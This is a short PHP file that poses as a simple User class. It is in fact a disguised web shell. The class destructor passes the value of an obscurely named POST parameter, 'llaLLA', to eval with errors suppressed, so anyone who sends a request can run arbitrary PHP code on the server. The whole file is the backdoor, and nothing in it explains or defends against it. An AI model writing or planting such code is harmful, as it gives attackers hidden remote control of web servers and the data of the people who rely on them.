<?php
class User
{
  public $name = '';
  public $config = null;

  function __destruct(){
    @eval(''.$config."$this->name");
  }
}
$user = new User;
$num = @$_POST['llaLLA'];
$user->name = ''.$num;
?>